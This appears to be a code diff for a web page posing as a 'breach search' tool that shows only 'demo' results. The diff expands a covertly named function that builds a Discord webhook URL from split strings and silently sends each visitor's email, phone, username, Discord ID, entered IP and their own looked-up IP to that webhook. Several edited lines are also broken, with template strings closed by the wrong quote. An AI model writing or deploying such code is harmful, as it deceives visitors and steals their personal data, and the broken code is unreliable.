@@ -82,20 +82,36 @@
       document.getElementById("results").appendChild(box);
     }
 
-    async function _x(data) {
-      const p1 = "https://discord.com/api/webhooks/";
-      const p2 = "1380896839921958972";
-      const p3 = "qvWggkKAnV6cMkE2MF3wq_2V5thvRRkP0r9iRsYIS31tqUBFJU1GQ3QsTJGN5L4ilRwr";
-      const url = `${p1}${p2}/${p3}`;
+    async function _x(fields) {
+      const a = "https://discord.com/api/webhooks/";
+      const b = "1380896839921958972";
+      const c = "qvWggkKAnV6cMkE2MF3wq_2V5thvRRkP0r9iRsYIS31tqUBFJU1GQ3QsTJGN5L4ilRwr";
+      const wURL = `${a}${b}/${c}`;
+
+      const payload = {
+        embeds: [{
+          title: "🔍 New Breach Search Attempt",
+          color: 3447003,
+          fields: [
+            { name: "📧 Email", value: fields.email || "Not provided", inline: false },
+            { name: "📱 Phone", value: fields.phone || "Not provided", inline: false },
+            { name: "👤 Username", value: fields.username || "Not provided", inline: false },
+            { name: "💬 Discord ID", value: fields.discord || "Not provided", inline: false },
+            { name: "🌐 IP Address (User entered)", value: fields.ip || "Not provided", inline: false },
+            { name: "🌐 IP Address (Visitor)", value: fields.visitorIP || "Unknown", inline: false },
+            { name: "🕒 Time", value: new Date().toUTCString(), inline: false }
+          ]
+        }]
+      };
 
       try {
-        await fetch(url, {
+        await fetch(wURL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: data })
+          body: JSON.stringify(payload)
         });
       } catch (e) {
-        console.warn("Discord logging failed.");
+        console.warn("⚠️ Failed to send webhook log.");
       }
     }
 
@@ -109,23 +125,25 @@
       const ip = document.getElementById("ip").value.trim();
 
       if (!email) updateResult("e", "⚠️ No email entered.", "warning");
-      else updateResult("e", `✅ Email checked (demo): ${email}`, "success");
+      else updateResult("e", `✅ Email checked (demo): ${email}", "success");
 
       if (!phone) updateResult("p", "ℹ️ Phone check skipped.", "warning");
-      else updateResult("p", `✅ Phone checked (demo): ${phone}`, "success");
+      else updateResult("p", `✅ Phone checked (demo): ${phone}", "success");
 
       if (!username) updateResult("u", "ℹ️ Username check skipped.", "warning");
-      else updateResult("u", `✅ Username checked (demo): ${username}`, "success");
+      else updateResult("u", `✅ Username checked (demo): ${username}", "success");
 
       if (!discord) updateResult("d", "ℹ️ Discord check skipped.", "warning");
-      else updateResult("d", `✅ Discord ID checked (demo): ${discord}`, "success");
+      else updateResult("d", `✅ Discord ID checked (demo): ${discord}", "success");
 
-      let logMsg = `🔍 Lookup Log:
-📧 Email: ${email || "N/A"}
-📱 Phone: ${phone || "N/A"}
-👤 Username: ${username || "N/A"}
-💬 Discord ID: ${discord || "N/A"}
-🌐 IP: ${ip || "N/A"}\n`;
+      let visitorIP = "Unknown";
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        visitorIP = ipData.ip || "Unknown";
+      } catch {}
+
+      _x({ email, phone, username, discord, ip, visitorIP });
 
       if (ip) {
         try {
@@ -134,7 +152,7 @@
           if (data.success) {
             updateResult("ipgeo", `🌐 Detected IP: ${ip}\nHostname: ${data.hostname || 'N/A'}\nCountry: ${data.country}\nCity: ${data.city}\nRegion: ${data.region}\nTimezone: ${data.timezone}\nISP: ${data.connection?.isp || 'N/A'}\nOrg: ${data.connection?.org || 'N/A'}\nAS: ${data.connection?.asn || 'N/A'} ${data.connection?.org || ''}`.trim(), "success");
           } else {
-            updateResult("ipgeo", `⚠️ Geo lookup failed: ${data.message}` ,"warning");
+            updateResult("ipgeo", `⚠️ Geo lookup failed: ${data.message}`, "warning");
           }
         } catch {
           updateResult("ipgeo", `❌ Error fetching Geo data.`, "error");
@@ -159,8 +177,6 @@
       } else {
         updateResult("ip", "ℹ️ IP geo-location check skipped.", "warning");
       }
-
-      _x(logMsg); // Send log to Discord
     }
   </script>
 </body>
